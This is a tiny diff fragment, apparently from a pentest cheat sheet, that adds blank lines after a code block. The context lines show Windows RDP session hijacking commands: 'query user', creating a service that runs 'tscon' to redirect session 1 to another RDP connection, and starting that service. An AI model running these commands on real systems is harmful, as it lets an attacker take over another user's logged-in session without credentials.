@@ -17,3 +17,5 @@ query user
 create sesshijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#55"
 net start sesshijack
 ```
+
+
